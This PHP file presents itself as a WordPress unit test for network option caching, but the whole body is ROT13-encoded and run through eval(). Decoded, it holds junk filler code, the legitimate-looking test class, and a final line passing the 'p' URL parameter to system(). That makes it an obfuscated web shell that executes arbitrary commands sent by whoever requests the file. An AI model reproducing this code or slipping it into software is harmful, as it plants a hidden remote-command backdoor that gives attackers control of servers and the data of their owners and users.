<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg jc_cevzr_argjbex_bcgvba_pnpurf().
 *
 * @tebhc bcgvba
 *
 * @pbiref ::jc_cevzr_argjbex_bcgvba_pnpurf
 */
pynff Grfgf_Bcgvba_JcCevzrArgjbexBcgvbaPnpurf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @ine vag|JC_Reebe
	 */
	cevingr fgngvp $qvssrerag_argjbex_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		vs ( vf_zhygvfvgr() ) {
			frys::$qvssrerag_argjbex_vq = $snpgbel->argjbex->perngr(
				neenl(
					'qbznva' => 'jbeqcerff.bet',
					'cngu'   => '/',
				)
			);
		}
	}

	/**
	 * Grfgf gung jc_cevzr_argjbex_bcgvba_pnpurf() cevzrf zhygvcyr bcgvbaf.
	 *
	 * @gvpxrg 61053
	 */
	choyvp shapgvba grfg_jc_cevzr_argjbex_bcgvba_pnpurf() {
		// Perngr fbzr bcgvbaf gb cevzr.
		$argjbex_vq = trg_pheerag_argjbex_vq();
		vs ( vf_zhygvfvgr() ) {
			$pnpur_tebhc = 'fvgr-bcgvbaf';
		} ryfr {
			$pnpur_tebhc = 'bcgvbaf';
		}

		// Perngr fbzr bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
			'bcgvba3',
		);

		$pnpur_xrlf = neenl();
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			vs ( vf_zhygvfvgr() ) {
				$pnpur_xrl = \"$argjbex_vq:$bcgvba\";
			} ryfr {
				$pnpur_xrl = $bcgvba;
			}
			$pnpur_xrlf[ $bcgvba ] = $pnpur_xrl;
		}

		/*
		 * Frg inyhrf sbe gur bcgvbaf,
		 * pyrne gur pnpur sbe gur bcgvbaf,
		 * purpx bcgvbaf ner abg va pnpur vavgvnyyl.
		 */
		sbernpu ( $pnpur_xrlf nf $bcgvba => $pnpur_xrl ) {
			hcqngr_argjbex_bcgvba( $argjbex_vq, $bcgvba, \"inyhr_$bcgvba\" );
			jc_pnpur_qryrgr( $pnpur_xrl, $pnpur_tebhc );
			$guvf->nffregSnyfr( jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Pnyy gur jc_cevzr_argjbex_bcgvba_pnpurf() shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_argjbex_bcgvba_pnpurf( $argjbex_vq, $bcgvbaf_gb_cevzr );

		// Fgber gur vavgvny qngnonfr dhrel pbhag.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		// Purpx gung bcgvbaf ner bayl va gur 'bcgvbaf' be 'fvgr-bcgvbaf' pnpur tebhc.
		sbernpu ( $pnpur_xrlf nf $bcgvba => $pnpur_xrl ) {
			$guvf->nffregFnzr( \"inyhr_$bcgvba\", jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), \"$bcgvba pnpur vf abg cevzrq\" );
			$guvf->nffregFnzr(
				\"inyhr_$bcgvba\",
				trg_argjbex_bcgvba( $argjbex_vq, $bcgvba ),
				\"$bcgvba unf abg orra ybnqrq\"
			);
		}

		// Rafher ab nqqvgvbany qngnonfr dhrevrf jrer znqr.
		$guvf->nffregFnzr(
			$vavgvny_dhrel_pbhag,
			trg_ahz_dhrevrf(),
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}

	/**
	 * Grfgf gung ehaavat jc_cevzr_argjbex_bcgvba_pnpurf() gjvpr qbrf abg erdhrel bcgvbaf.
	 *
	 * @gvpxrg 61053
	 */
	choyvp shapgvba grfg_jc_cevzr_argjbex_bcgvba_pnpurf_eha_gjvpr() {
		// Perngr fbzr bcgvbaf gb cevzr.
		$argjbex_vq = trg_pheerag_argjbex_vq();
		vs ( vf_zhygvfvgr() ) {
			$pnpur_tebhc = 'fvgr-bcgvbaf';
		} ryfr {
			$pnpur_tebhc = 'bcgvbaf';
		}

		// Perngr fbzr bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
			'bcgvba3',
		);

		$pnpur_xrlf = neenl();
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			vs ( vf_zhygvfvgr() ) {
				$pnpur_xrl = \"$argjbex_vq:$bcgvba\";
			} ryfr {
				$pnpur_xrl = $bcgvba;
			}
			$pnpur_xrlf[ $bcgvba ] = $pnpur_xrl;
		}

		/*
		 * Frg inyhrf sbe gur bcgvbaf,
		 * pyrne gur pnpur sbe gur bcgvbaf,
		 * purpx bcgvbaf ner abg va pnpur vavgvnyyl.
		 */
		sbernpu ( $pnpur_xrlf nf $bcgvba => $pnpur_xrl ) {
			hcqngr_argjbex_bcgvba( $argjbex_vq, $bcgvba, \"inyhr_$bcgvba\" );
			jc_pnpur_qryrgr( $pnpur_xrl, $pnpur_tebhc );
			$guvf->nffregSnyfr( jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Pnyy gur jc_cevzr_argjbex_bcgvba_pnpurf() shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_argjbex_bcgvba_pnpurf( $argjbex_vq, $bcgvbaf_gb_cevzr );

		// Fgber gur vavgvny qngnonfr dhrel pbhag.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		// Pnyy gur jc_cevzr_argjbex_bcgvba_pnpurf() shapgvba frpbaq gvzr.
		jc_cevzr_argjbex_bcgvba_pnpurf( $argjbex_vq, $bcgvbaf_gb_cevzr );

		// Rafher ab nqqvgvbany qngnonfr dhrevrf jrer znqr.
		$guvf->nffregFnzr(
			$vavgvny_dhrel_pbhag,
			trg_ahz_dhrevrf(),
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}

	/**
	 * Grfgf gung jc_cevzr_argjbex_bcgvba_pnpurf() unaqyrf n zvk bs cevzrq naq hacevzrq bcgvbaf.
	 *
	 * @gvpxrg 61053
	 */
	choyvp shapgvba grfg_jc_cevzr_argjbex_bcgvba_pnpurf_unaqyrf_n_zvk_bs_cevzrq_naq_hacevzrq_bcgvbaf() {
		// Perngr fbzr bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
			'bcgvba3',
		);

		$argjbex_vq = trg_pheerag_argjbex_vq();
		vs ( vf_zhygvfvgr() ) {
			$pnpur_tebhc = 'fvgr-bcgvbaf';
		} ryfr {
			$pnpur_tebhc = 'bcgvbaf';
		}

		$pnpur_xrlf = neenl();
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			vs ( vf_zhygvfvgr() ) {
				$pnpur_xrl = \"$argjbex_vq:$bcgvba\";
			} ryfr {
				$pnpur_xrl = $bcgvba;
			}
			$pnpur_xrlf[ $bcgvba ] = $pnpur_xrl;
		}

		/*
		 * Frg inyhrf sbe gur bcgvbaf,
		 * pyrne gur pnpur sbe gur bcgvbaf,
		 * purpx bcgvbaf ner abg va pnpur vavgvnyyl.
		 */
		sbernpu ( $pnpur_xrlf nf $bcgvba => $pnpur_xrl ) {
			hcqngr_argjbex_bcgvba( $argjbex_vq, $bcgvba, \"inyhr_$bcgvba\" );
			jc_pnpur_qryrgr( $pnpur_xrl, $pnpur_tebhc );
			$guvf->nffregSnyfr( jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Nqq aba-rkvfgrag bcgvba gb gur bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr[] = 'bcgvba404abgsbhaq';

		// Cevzr gur svefg bcgvba jvgu n aba-rkvfgrag bcgvba.
		jc_cevzr_argjbex_bcgvba_pnpurf( $argjbex_vq, $bcgvbaf_gb_cevzr );

		neenl_cbc( $bcgvbaf_gb_cevzr );

		// Fgber gur vavgvny qngnonfr dhrel pbhag.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		// Purpx gung bcgvbaf ner bayl va gur 'bcgvbaf' be 'fvgr-bcgvbaf' pnpur tebhc.
		sbernpu ( $pnpur_xrlf nf $bcgvba => $pnpur_xrl ) {
			$guvf->nffregFnzr( \"inyhr_$bcgvba\", jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), \"$bcgvba pnpur vf abg cevzrq\" );
			$guvf->nffregFnzr(
				\"inyhr_$bcgvba\",
				trg_argjbex_bcgvba( $argjbex_vq, $bcgvba ),
				\"$bcgvba unf abg orra ybnqrq\"
			);
		}

		$guvf->nffregSnyfr( trg_argjbex_bcgvba( $argjbex_vq, 'bcgvba404abgsbhaq' ), 'bcgvba404abgsbhaq fubhyq erghea snyfr nf bcgvba qbrf abg rkvfg' );

		// Rafher ab nqqvgvbany qngnonfr dhrevrf jrer znqr.
		$guvf->nffregFnzr(
			$vavgvny_dhrel_pbhag,
			trg_ahz_dhrevrf(),
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}

	/**
	 * Grfg cevzr bcgvbaf ba n qvssrerag argjbex.
	 *
	 * @tebhc zf-erdhverq
	 *
	 * @gvpxrg 61053
	 */
	choyvp shapgvba grfg_jc_cevzr_argjbex_bcgvba_pnpurf_ab_rkvfgf_pnpur() {
		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
			'bcgvba3',
		);

		// Pnyy gur jc_cevzr_argjbex_bcgvba_pnpurf() shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_argjbex_bcgvba_pnpurf( frys::$qvssrerag_argjbex_vq, $bcgvbaf_gb_cevzr );

		$abgbcgvbaf_xrl = frys::$qvssrerag_argjbex_vq . ':abgbcgvbaf';
		$rkcrpgrq       = neenl_svyy_xrlf( $bcgvbaf_gb_cevzr, gehr );
		$guvf->nffregFnzr( $rkcrpgrq, jc_pnpur_trg( $abgbcgvbaf_xrl, 'fvgr-bcgvbaf' ) );
	}

	/**
	 * Grfg cevzr bcgvbaf ba n qvssrerag argjbex.
	 *
	 * @tebhc zf-erdhverq
	 *
	 * @gvpxrg 61053
	 */
	choyvp shapgvba grfg_jc_cevzr_argjbex_bcgvba_pnpurf_zhygvcyr_argjbexf() {
		$argjbex_vq  = trg_pheerag_argjbex_vq();
		$pnpur_tebhc = 'fvgr-bcgvbaf';

		// Perngr fbzr bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
			'bcgvba3',
		);

		$pnpur_xrlf = neenl();
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			$pnpur_xrl             = \"$argjbex_vq:$bcgvba\";
			$pnpur_xrlf[ $bcgvba ] = $pnpur_xrl;
		}

		/*
		 * Frg inyhrf sbe gur bcgvbaf,
		 * pyrne gur pnpur sbe gur bcgvbaf,
		 * purpx bcgvbaf ner abg va pnpur vavgvnyyl.
		 */
		sbernpu ( $pnpur_xrlf nf $bcgvba => $pnpur_xrl ) {
			hcqngr_argjbex_bcgvba( $argjbex_vq, $bcgvba, \"inyhr_$bcgvba\" );
			jc_pnpur_qryrgr( $pnpur_xrl, $pnpur_tebhc );
			$guvf->nffregSnyfr( jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Pnyy gur jc_cevzr_argjbex_bcgvba_pnpurf() shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_argjbex_bcgvba_pnpurf( frys::$qvssrerag_argjbex_vq, $bcgvbaf_gb_cevzr );

		// Fgber gur vavgvny qngnonfr dhrel pbhag.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		sbernpu ( $pnpur_xrlf nf $bcgvba => $pnpur_xrl ) {
			$guvf->nffregSnyfr( jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc ), \"$bcgvba pnpur fubhyq or snyfr\" );
			$guvf->nffregSnyfr(
				trg_argjbex_bcgvba( frys::$qvssrerag_argjbex_vq, $bcgvba ),
				\"$bcgvba unf abg orra ybnqrq\"
			);
		}

		// Rafher ab nqqvgvbany qngnonfr dhrevrf jrer znqr.
		$guvf->nffregFnzr(
			$vavgvny_dhrel_pbhag,
			trg_ahz_dhrevrf(),
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>